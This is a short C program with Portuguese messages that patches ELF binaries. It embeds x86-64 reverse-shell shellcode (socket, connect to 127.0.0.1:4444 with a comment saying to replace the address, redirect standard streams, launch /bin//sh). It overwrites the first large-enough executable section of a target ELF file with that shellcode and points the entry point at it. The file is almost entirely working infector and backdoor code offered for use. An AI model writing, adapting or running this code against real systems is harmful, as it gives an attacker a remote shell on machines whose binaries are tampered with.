#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>


unsigned char shellcode[] = 
"\x48\x31\xd2"                                      // xor    rdx, rdx
"\x48\x31\xf6"                                      // xor    rsi, rsi
"\x48\x31\xff"                                      // xor    rdi, rdi
"\x6a\x29"                                          // push   0x29
"\x58"                                              // pop    rax
"\x6a\x02"                                          // push   0x2
"\x5f"                                              // pop    rdi
"\x6a\x01"                                          // push   0x1
"\x5e"                                              // pop    rsi
"\x0f\x05"                                          // syscall

"\x48\x97"                                          // xchg   rax, rdi
"\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01"          // movabs rsi,0x101007f5c110002
                                                     // (IP: 127.0.0.1, Porta: 4444 <- substitua isso)
"\x51"                                              // push   rcx
"\x48\x89\xe6"                                      // mov    rsi,rsp
"\x6a\x10"                                          // push   0x10
"\x5a"                                              // pop    rdx
"\x6a\x2a"                                          // push   0x2a
"\x58"                                              // pop    rax
"\x0f\x05"                                          // syscall

"\x6a\x03"                                          // push   0x3
"\x5e"                                              // pop    rsi
"\x48\xff\xce"                                      // dec    rsi
"\x6a\x21"                                          // push   0x21
"\x58"                                              // pop    rax
"\x0f\x05"                                          // syscall
"\x75\xf6"                                          // jne    0x3f
"\x6a\x3b"                                          // push   0x3b
"\x58"                                              // pop    rax
"\x99"                                              // cdq    
"\x52"                                              // push   rdx
"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"          // movabs rbx,0x68732f2f6e69622f
"\x53"                                              // push   rbx
"\x48\x89\xe7"                                      // mov    rdi,rsp
"\x52"                                              // push   rdx
"\x57"                                              // push   rdi
"\x48\x89\xe6"                                      // mov    rsi,rsp
"\x0f\x05";                                         // syscall

void inject_shellcode(const char *filename) {
    int fd = open(filename, O_RDWR);
    if (fd < 0) {
        perror("[-]Erro ao abrir o arquivo ELF");
        exit(1);
    }

    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
        perror("[-]Erro ao ler o cabeçalho ELF");
        close(fd);
        exit(1);
    }

    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        printf("[-]Arquivo não é ELF.\n");
        close(fd);
        exit(1);
    }

    printf("[+] ELF verificado.\n");
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    Elf64_Shdr shdr;
    for (int i = 0; i < ehdr.e_shnum; i++) {
        read(fd, &shdr, sizeof(shdr));
        if (shdr.sh_size >= sizeof(shellcode) && shdr.sh_flags & SHF_EXECINSTR) {
            printf("[+] Seção %d escolhida para injeção.\n", i);
            lseek(fd, shdr.sh_offset, SEEK_SET);
            write(fd, shellcode, sizeof(shellcode));
            printf("[+] Shellcode injetado na seção %d.\n", i);
            ehdr.e_entry = shdr.sh_addr;
            lseek(fd, 0, SEEK_SET);
            write(fd, &ehdr, sizeof(ehdr));
            printf("[+] Ponto de entrada modificado.\n");

            break;
        }
    }

    close(fd);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <arquivo_elf>\n", argv[0]);
        return 1;
    }

    inject_shellcode(argv[1]);
    return 0;
}
